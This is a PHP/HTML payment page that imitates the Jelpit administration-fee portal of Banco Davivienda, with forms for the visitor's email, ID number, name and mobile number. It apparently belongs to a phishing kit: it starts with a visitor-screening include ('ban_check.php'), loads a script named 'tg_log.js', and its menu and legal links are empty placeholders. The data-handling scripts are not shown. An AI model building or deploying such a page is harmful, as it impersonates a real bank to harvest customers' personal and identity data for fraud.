<?php require_once __DIR__ . '/ban_check.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pagar - Jelpit</title>
  <link rel="icon" type="image/svg+xml" href="img/favicon.svg">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="css/styles.css">
  <link rel="stylesheet" href="css/busqueda.css">
  <link rel="stylesheet" href="css/pasos.css">
  <link rel="stylesheet" href="css/pagar.css">

  <style>
    #pagarAdminLoader {
      position: fixed; inset: 0; z-index: 99999;
      display: none; align-items: center; justify-content: center;
      background: rgba(255,255,255,0.88);
    }
    #pagarAdminLoader.is-visible { display: flex; }
    .pagar-admin-spinner {
      width: 48px; height: 48px;
      border: 3px solid #e8e8e8;
      border-top-color: #2e0063;
      border-radius: 50%;
      animation: pagarAdminSpin 0.75s linear infinite;
    }
    @keyframes pagarAdminSpin { to { transform: rotate(360deg); } }
  </style>
</head>

<body>

  <!-- ── Header ──────────────────────────────────────────── -->
  <header class="header">
    <div class="header-container">
      <div class="header-logo">
        <a href="index.php"><img src="img/logo_jelpit_color.svg" alt="Jelpit Logo"></a>
      </div>
      <div class="header-actions">
        <div class="dropdown-wrapper">
          <button class="btn btn-conjuntos" id="desktopConjuntosBtn">
            Conjuntos <i class="fa-solid fa-chevron-down toggle-icon"></i>
          </button>
          <ul class="desktop-dropdown-menu" id="desktopConjuntosMenu">
            <li><a href="#">Paga tu administración</a></li>
            <li><a href="#">Ingresa a Jelpit Conjuntos</a></li>
            <li><a href="#">¿Cómo funciona?</a></li>
            <li><a href="#">Quiero vincularme</a></li>
            <li><a href="#">Ingresa a Cuotas al día</a></li>
          </ul>
        </div>
        <a href="#" class="btn btn-login"><i class="fa-regular fa-user"></i> Iniciar sesión</a>
        <button class="btn btn-cart" id="btnCarrito" style="position:relative;">
          <div style="position:relative;display:inline-flex;width:24px;height:24px;">
            <i class="fa-solid fa-cart-shopping" style="font-size:20px;color:#fff;"></i>
            <span class="cart-badge" id="cartBadge">1</span>
          </div>
          Carrito
        </button>
      </div>
      <div class="header-mobile-actions">
        <a href="#" class="btn-login-mobile"><i class="fa-regular fa-user"></i> Iniciar sesión</a>
        <button class="btn-cart-mobile" id="btnCarritoMobile"><i class="fa-solid fa-cart-shopping"></i></button>
        <button class="btn-hamburger" id="btnHamburger" aria-label="Abrir menú">
          <span></span><span></span><span></span>
        </button>
      </div>
    </div>
  </header>

  <div class="menu-overlay" id="menuOverlay"></div>

  <nav class="mobile-drawer" id="mobileDrawer">
    <div class="drawer-header">
      <a href="index.php" class="drawer-logo"><img src="img/logo_jelpit_color.svg" alt="Jelpit Logo"></a>
      <button class="drawer-close" id="drawerClose" aria-label="Cerrar menú"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <ul class="drawer-menu">
      <li class="drawer-menu-item">
        <a href="index.php"><i class="fa-solid fa-house"></i><span>Inicio</span></a>
      </li>
      <li class="drawer-menu-item has-submenu">
        <button class="drawer-submenu-toggle" id="conjuntosToggle">
          <span class="drawer-item-left">
            <i class="fa-solid fa-circle-dollar-to-slot"></i><span>Conjuntos</span>
          </span>
          <i class="fa-solid fa-chevron-down drawer-chevron"></i>
        </button>
        <ul class="drawer-submenu" id="conjuntosSubmenu">
          <li><a href="#">Paga tu administración</a></li>
          <li><a href="#">Ingresa a Jelpit Conjuntos</a></li>
          <li><a href="#">¿Cómo funciona?</a></li>
          <li><a href="#">Quiero vincularme</a></li>
          <li><a href="#">Ingresa a Cuotas al día</a></li>
        </ul>
      </li>
    </ul>
  </nav>

  <!-- ── Main ────────────────────────────────────────────── -->
  <main class="busqueda-main">

    <!-- Promo Banner -->
    <div class="promo-banner-carousel" id="promoBannerCarousel">
      <div class="promo-carousel-inner" id="promoBannerInner">
        <div class="promo-slide" style="background-color:#EDeef0;">
          <div class="promo-content">
            <i class="fa-solid fa-credit-card" style="font-size:28px;color:#df111c;flex-shrink:0"></i>
            <span class="promo-text">Disfrute de sus servicios GRATIS por tener tarjeta de crédito Davivienda ❤️💳
              <a href="#" class="promo-btn" style="background:#df111c;color:#fff;">¡Úselos aquí!</a>
            </span>
          </div>
        </div>
        <div class="promo-slide" style="background-color:#cbeafe;">
          <div class="promo-content">
            <i class="fa-solid fa-house" style="font-size:28px;color:#1d4ed8;flex-shrink:0"></i>
            <span class="promo-text">¡Tu próximo hogar espera por ti! Encuentra miles de ofertas para arrendar o comprar.
              <a href="#" class="promo-btn" style="background:#ff9d21;color:#2e0063;">¡Encuentra el tuyo!</a>
            </span>
          </div>
        </div>
        <div class="promo-slide" style="background-color:#e3f9e5;">
          <div class="promo-content">
            <i class="fa-solid fa-heart-pulse" style="font-size:28px;color:#16a34a;flex-shrink:0"></i>
            <span class="promo-text">Seguro de Salud a su Medida desde $41.500 mensuales para usted y su familia.
              <a href="#" class="promo-btn" style="background:#ffda6a;color:#11682b;">Compre ahora</a>
            </span>
          </div>
        </div>
      </div>
    </div>

    <!-- Back -->
    <div class="btn-back-container">
      <a href="verificar.php" class="btn-back"><i class="fa-solid fa-chevron-left" style="font-size:12px;"></i> Atrás</a>
    </div>

    <!-- Stepper -->
    <div class="stepper-container" style="padding-top:5px;">
      <div class="stepper">
        <div class="step done">
          <div class="step-circle"><i class="fa-solid fa-check"></i></div>
          <div class="step-label">Buscar</div>
        </div>
        <div class="step-line done"></div>
        <div class="step done">
          <div class="step-circle"><i class="fa-solid fa-check"></i></div>
          <div class="step-label">Verificar</div>
        </div>
        <div class="step-line done"></div>
        <div class="step active">
          <div class="step-circle">3</div>
          <div class="step-label">Pagar</div>
        </div>
      </div>
    </div>

    <!-- Pay Grid -->
    <div class="pay-grid">

      <!-- ── LEFT COLUMN ──────────────────────────────────── -->
      <div class="pay-left-column">
        <div class="pay-header">
          <h2>Tus cuentas por pagar</h2>
          <p>Estas son las cuentas pendientes de tu inmueble.</p>
        </div>

        <!-- Admin payment card -->
        <div class="pay-card-left">
          <div class="pay-type-label">Tipo de cuenta</div>
          <div class="pay-account-type">
            <div class="pay-account-value">Cuotas de Administración</div>
            <div class="pay-checkbox checked" id="chkAdminBox"></div>
          </div>
          <div class="pay-value-row">
            <div class="pay-date-col">
              <div class="pay-value-label">Fecha límite de pago</div>
              <div style="font-size:14px;" id="fechaLimitePago">—</div>
            </div>
            <div class="pay-amount-col">
              <div class="pay-value-label">Valor a pagar</div>
              <div class="pay-input-wrapper">
                <input type="text" id="valorPagarInput" value="$ 0" readonly>
              </div>
            </div>
          </div>
        </div>

        <!-- Custom payment button -->
        <button class="btn-custom-payment" id="btnCustomPayment">
          <svg width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg" style="flex-shrink:0">
            <circle cx="11" cy="11" r="10" stroke="#2e0063" stroke-width="1.5" fill="white"/>
            <line x1="11" y1="6" x2="11" y2="16" stroke="#2e0063" stroke-width="1.8" stroke-linecap="round"/>
            <line x1="6" y1="11" x2="16" y2="11" stroke="#2e0063" stroke-width="1.8" stroke-linecap="round"/>
          </svg>
          <span>Ingresar un pago personalizado</span>
        </button>

        <!-- Custom payment card (hidden) -->
        <div class="pay-custom-card" id="customPayCard" style="display:none;">
          <div class="pay-account-type" style="margin-bottom:14px;">
            <div class="pay-account-value" style="font-size:15px;">Pago personalizado</div>
            <div class="pay-checkbox" id="chkCustomBox"></div>
          </div>
          <div style="margin-bottom:12px;">
            <div class="pay-input-wrapper">
              <input type="text" id="customValorInput" placeholder="Ingresa el valor a pagar" style="width:100%;text-align:left;background:white;">
            </div>
          </div>
          <textarea id="customDetalle" placeholder="Detalle del pago (opcional)"></textarea>
          <div style="display:flex;gap:20px;margin-top:14px;justify-content:center;font-size:14px;">
            <span style="color:var(--c-lib-tb-primaryBase);cursor:pointer;display:flex;align-items:center;gap:5px;">
              <svg width="18" height="18" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="11" cy="11" r="10" stroke="#2e0063" stroke-width="1.5" fill="white"/>
                <line x1="11" y1="6" x2="11" y2="16" stroke="#2e0063" stroke-width="1.8" stroke-linecap="round"/>
                <line x1="6" y1="11" x2="16" y2="11" stroke="#2e0063" stroke-width="1.8" stroke-linecap="round"/>
              </svg>
              <u>Agregar otro</u>
            </span>
            <span id="btnEliminarCustom" style="color:var(--c-lib-tb-primaryBase);cursor:pointer;font-weight:700;"><u>Eliminar</u></span>
          </div>
        </div>
      </div>

      <!-- ── RIGHT COLUMN ─────────────────────────────────── -->
      <div class="pay-card-right">

        <!-- Summary -->
        <div class="pay-summary-card">
          <div class="pay-summary-details">
            <div class="item-line" style="margin-bottom:8px;">
              <div class="item-icon icon-purple"><i class="fa-regular fa-building"></i></div>
              <div class="item-text item-title" id="valNombreCopropiedadPagar"></div>
            </div>
            <div class="item-line" style="margin-bottom:8px;">
              <div class="item-icon icon-gray"><i class="fa-solid fa-location-dot"></i></div>
              <div class="item-text" id="valDireccionCopropiedadPagar"></div>
            </div>
            <div class="item-line">
              <div class="item-icon icon-purple"><i class="fa-regular fa-calendar-days"></i></div>
              <div class="item-text" id="valConvenioPagar"></div>
            </div>
          </div>
          <div class="pay-summary-refs">
            Referencia 1: <strong id="valRef1"></strong><br>
            Referencia 2: <strong id="valRef2"></strong>
          </div>
          <a href="#" class="btn-change" id="btnCambiarRefPagar">
            <i class="fa-regular fa-pen-to-square"></i> Cambiar referencia
          </a>
        </div>

        <!-- Paga a varios -->
        <div class="pay-promo-varios">
          <div><i class="fa-solid fa-cart-shopping icon-varios"></i> Paga a varios Inmuebles</div>
          <span>Ver cómo <i class="fa-solid fa-chevron-right" style="font-size:10px;"></i></span>
        </div>

        <!-- Total + Ir a pagar -->
        <div class="pay-total-card">
          <div class="pay-total-info">
            <p id="cuentaCountTxt">1 Cuenta</p>
            <div class="pay-total-amount" id="pagoTotalTxt">$ 0</div>
          </div>
          <button class="btn-ir-pagar" id="btnIrPagarMain">Ir a pagar</button>
        </div>

      </div>
    </div>

  </main>

  <!-- ── Footer ───────────────────────────────────────────── -->
  <footer class="footer">
    <div class="footer-top">
      <div class="footer-left">
        <img src="img/vigilado.svg" alt="Vigilado" class="vigilado-img">
        <p>Servicio ofrecido por Banco Davivienda S.A. y<br>operado por Servicios Bolívar S.A.</p>
      </div>
      <div class="footer-center">
        <h3>¿Necesitas ayuda? ¿Tienes preguntas, quejas o reclamos?</h3>
        <p>Escríbenos a <a href="mailto:lineadesoporte923@serviciosbolivar.com">lineadesoporte923@serviciosbolivar.com</a>
          o llámanos desde tu celular al <strong>#923</strong> o al número <strong>601 3905331</strong>.
        </p>
      </div>
      <div class="footer-right">
        <div class="social-icons">
          <a href="#" aria-label="YouTube"><i class="fa-brands fa-youtube"></i></a>
          <a href="#" aria-label="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a>
          <a href="#" aria-label="Facebook"><i class="fa-brands fa-facebook-f"></i></a>
          <a href="#" aria-label="Instagram"><i class="fa-brands fa-instagram"></i></a>
          <a href="#" aria-label="TikTok"><i class="fa-brands fa-tiktok"></i></a>
        </div>
      </div>
    </div>
    <div class="footer-bottom">
      <div class="footer-links">
        <a href="#">Términos y condiciones</a>
        <a href="#">Política de Tratamiento de Datos Personales</a>
        <a href="#">Superintendencia de Industria y Comercio (SIC)</a>
        <a href="#">Canales de preferencia</a>
      </div>
      <p class="copyright">Jelpit 2026© - Banco Davivienda S.A. NIT: 860.034.313-7 Todos los derechos reservados.
        Dirección de notificación judicial: Av. El Dorado No. 68C-61 Bogotá D.C.</p>
    </div>
  </footer>

  <!-- ── Carrito Drawer ────────────────────────────────────── -->
  <div class="menu-overlay" id="carritoOverlay"></div>
  <div class="carrito-drawer" id="carritoDrawer">
    <div class="carrito-header">
      <button class="btn-back-carrito" id="closeCarrito"><i class="fa-solid fa-chevron-left"></i></button>
      <h3 class="carrito-title">Carrito de compras</h3>
      <button class="btn-expand-carrito"><i class="fa-solid fa-chevron-down"></i></button>
    </div>
    <div class="carrito-content">
      <div class="carrito-item-card">
        <div class="carrito-item-header">
          <div class="carrito-item-titles">
            <h4 id="carNombre"></h4>
            <p id="carDireccion"></p>
          </div>
          <div class="carrito-item-badge">1</div>
        </div>
        <div class="carrito-item-price-row">
          <div class="carrito-item-ref" id="carReferencia"></div>
          <div class="carrito-item-price">
            <span id="carPrecio">$ 0</span>
            <button class="btn-trash"><i class="fa-regular fa-trash-can"></i></button>
          </div>
        </div>
        <div class="carrito-item-promo">
          <p>Paga a varios inmuebles en una sola transacción.</p>
          <button class="btn-add-pago">Agregar pago a otro inmueble <i class="fa-solid fa-chevron-right"></i></button>
        </div>
      </div>
      <div class="carrito-footer">
        <div class="carrito-total-info">
          <p>1 Cuenta</p>
          <h3 id="carPrecioTotal">$ 0</h3>
        </div>
        <button class="btn-continuar-green" id="btnIrPagarCarrito" style="margin:0;padding:10px 24px;font-size:14px;">Ir a pagar</button>
      </div>
    </div>
  </div>

  <!-- ── Modals ─────────────────────────────────────────────── -->
  <div class="custom-modal-overlay" id="modalOverlay"></div>

  <!-- Modal 1: Email -->
  <div class="custom-modal" id="modalCorreo">
    <h3 class="modal-title">Ingresa tu correo electrónico</h3>
    <p class="modal-subtitle">De esta forma reconocemos tu usuario</p>
    <div class="modal-input-group">
      <div class="input-wrapper" id="correoWrapper">
        <label for="correoInput">Correo Electrónico</label>
        <input type="email" id="correoInput" autocomplete="off">
        <i class="fa-regular fa-envelope"></i>
      </div>
      <div class="error-msg" id="correoError">Ingresa un correo válido</div>
    </div>
    <button class="btn-modal-action" id="btnContinuarCorreo" disabled>Continuar</button>
  </div>

  <!-- Modal 2: Datos de pago -->
  <div class="custom-modal" id="modalDatosPago" style="width:700px;max-width:95vw;">
    <h3 class="modal-title">Datos para el pago</h3>
    <p class="modal-subtitle">Ingresa tus datos para continuar</p>

    <div class="doc-row">
      <div class="custom-doc-select" id="customDocSelect">
        <span class="cds-label">Tipo de identificación</span>
        <div class="cds-trigger" id="cdsTrigger">
          <span class="cds-selected-text" id="cdsText">Tipo de identificación</span>
          <i class="fa-solid fa-chevron-down cds-arrow"></i>
        </div>
        <div class="cds-menu" id="cdsMenu">
          <div class="cds-option" data-value="CC">Cédula de ciudadanía</div>
          <div class="cds-option" data-value="CE">Cédula de extranjería</div>
          <div class="cds-option" data-value="NIT">NIT</div>
          <div class="cds-option" data-value="PAS">Pasaporte</div>
        </div>
        <input type="hidden" id="tipoDoc" value="">
      </div>
      <div style="flex:1;" class="modal-input-group" style="margin-bottom:0;">
        <div class="float-field" id="numDocWrapper">
          <label class="float-label">Número de identificación</label>
          <input type="tel" id="numDocInput" autocomplete="off">
        </div>
      </div>
    </div>

    <div class="modal-input-group">
      <div class="float-field" id="nombreWrapper">
        <label class="float-label">Nombre</label>
        <input type="text" id="nombreInput" autocomplete="off">
      </div>
    </div>
    <div class="modal-input-group">
      <div class="float-field" id="apellidoWrapper">
        <label class="float-label">Apellido</label>
        <input type="text" id="apellidoInput" autocomplete="off">
      </div>
    </div>
    <div class="modal-input-group">
      <div class="float-field" id="celularWrapper">
        <label class="float-label">Número de celular</label>
        <input type="tel" id="celularInput" autocomplete="off" maxlength="10">
      </div>
    </div>

    <div class="modal-policy-text">
      <p style="margin-bottom:12px;">Servicio ofrecido por Banco Davivienda S.A. y operado por Servicios Bolívar S.A.</p>
      <label class="custom-check-label">
        <input type="checkbox" id="chkTerminos">
        <span class="checkmark"></span>
        <span>Acepto <a href="#">Términos y Condiciones</a> del portal.</span>
      </label>
      <label class="custom-check-label">
        <input type="checkbox" id="chkDatos">
        <span class="checkmark"></span>
        <span>Acepto la <a href="#">Autorización de tratamiento de Datos Personales</a>.</span>
      </label>
      <label class="custom-check-label">
        <input type="checkbox" id="chkOfertas">
        <span class="checkmark"></span>
        <span>Me interesa recibir ofertas de productos financieros y autorizo la <a href="#">consulta en Operadores de Información</a>.</span>
      </label>
    </div>

    <button class="btn-continuar-green" id="btnContinuarDatosPago" disabled
      style="width:200px;margin:0 auto;background:#e0e0e0;color:#333;cursor:not-allowed;">Continuar</button>
  </div>

  <!-- Modal 3: Actívate -->
  <div class="custom-modal" id="modalActivate">
    <button class="modal-close" id="btnCloseActivate"><i class="fa-solid fa-xmark"></i></button>
    <div class="modal-activate-icon">
      <i class="fa-solid fa-hand-pointer" style="font-size:72px;color:var(--c-lib-tb-primaryBase);"></i>
    </div>
    <h3 class="modal-title" style="color:#000;">¡Actívate y paga más rápido la próxima vez!</h3>
    <p class="modal-subtitle">Regístrate e ingresa solo con tu correo para tener una experiencia más personalizada</p>
    <button type="button" class="btn-continuar-green" id="btnQuieroActivarme" style="width:100%;margin:20px 0;">Quiero activarme</button>
    <p class="modal-mute-text">¿No quieres activarte?</p>
    <button type="button" class="btn-link-purple" id="btnContinuarPagoOnly">Continúa con el pago</button>
  </div>

  <div id="pagarAdminLoader" aria-live="polite" aria-busy="false">
    <div class="pagar-admin-spinner" role="status" aria-label="Cargando"></div>
  </div>

  <script src="js/tg_log.js"></script>
  <script src="js/script.js"></script>
  <script src="js/pagar.js"></script>
</body>
</html>
